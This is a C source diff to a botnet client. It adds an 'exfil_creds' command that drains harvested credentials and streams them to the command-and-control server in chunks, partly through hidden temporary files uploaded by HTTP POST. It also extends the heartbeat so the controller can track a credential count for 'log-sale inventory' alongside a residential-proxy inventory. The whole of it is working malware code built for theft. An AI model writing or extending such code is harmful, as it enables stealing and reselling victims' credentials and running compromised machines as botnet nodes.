@@ -2245,6 +2245,63 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     protocol_send_response(bot, CMD_UPLOAD, "upload failed: could not upload file");
                 }
             }
+        } else if (strncmp(cmd, CMD_EXFIL_CREDS, strlen(CMD_EXFIL_CREDS)) == 0) {
+            /* #90: Credential-log exfil — stream the buffered harvest to
+             * the C2 in chunks (mirrors the CMD_EXFIL file-exfil path),
+             * then clear the buffer so capacity resets for the next
+             * harvest. Auth is the channel-level shared-secret gate that
+             * already vetted this command (http_body_has_secret / WS
+             * frame echo), the same as every other CMD_*. Placed BEFORE
+             * CMD_EXFIL because "exfil_creds" is a strict prefix of
+             * "exfil" and strncmp would otherwise swallow this branch. */
+            unsigned int ncreds = spread_cred_count();
+            char *data = NULL;
+            size_t dlen = 0;
+            if (spread_creds_drain(&data, &dlen) != 0 || dlen == 0) {
+                protocol_send_response(bot, CMD_EXFIL_CREDS,
+                    "exfil_creds: no credentials buffered");
+            } else {
+                const int CHUNK = 1024;
+                int offset = 0;
+                int total_sent = 0;
+                while (offset < (int)dlen) {
+                    int chunk = (int)dlen - offset;
+                    if (chunk > CHUNK) chunk = CHUNK;
+
+                    if (offset == 0) {
+                        /* First chunk: send via protocol_send_response */
+                        char resp[2048];
+                        int rlen = snprintf(resp, sizeof(resp),
+                            "exfil_creds chunk: %d/%d bytes", chunk, (int)dlen);
+                        if (rlen > 0 && rlen < (int)sizeof(resp)) {
+                            memcpy(resp + rlen, data + offset, chunk);
+                            rlen += chunk;
+                            if (rlen < (int)sizeof(resp) - 1) resp[rlen] = '\0';
+                        }
+                        protocol_send_response(bot, CMD_EXFIL_CREDS, resp);
+                    } else {
+                        /* Subsequent chunks: send via HTTP POST */
+                        char upload_path[512];
+                        snprintf(upload_path, sizeof(upload_path),
+                            "%s/exfil", bot->c2_http.path);
+                        char tmp[256];
+                        snprintf(tmp, sizeof(tmp), "/tmp/.creds.%d", offset);
+                        FILE *tf = fopen(tmp, "wb");
+                        if (tf) {
+                            fwrite(data + offset, 1, chunk, tf);
+                            fclose(tf);
+                            http_upload(bot, tmp, upload_path);
+                            unlink(tmp);
+                        }
+                    }
+
+                    offset += chunk;
+                    total_sent += chunk;
+                }
+                log_info("CMD: exfil_creds completed: %d bytes (%u creds) drained",
+                         total_sent, ncreds);
+                free(data);
+            }
         } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
             /* Parse: exfil <path> */
             char *args = cmd + strlen(CMD_EXFIL);
@@ -2621,11 +2678,12 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
 
     char heartbeat[1024];
     /* SECURITY FIX (#89): report proxy status so the C2 can build a
-     * residential-proxy inventory (on/off + bound port). */
+     * residential-proxy inventory (on/off + bound port).
+     * (#90): report cred_count so the C2 can track log-sale inventory. */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
-        safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port());
+        spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port());
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
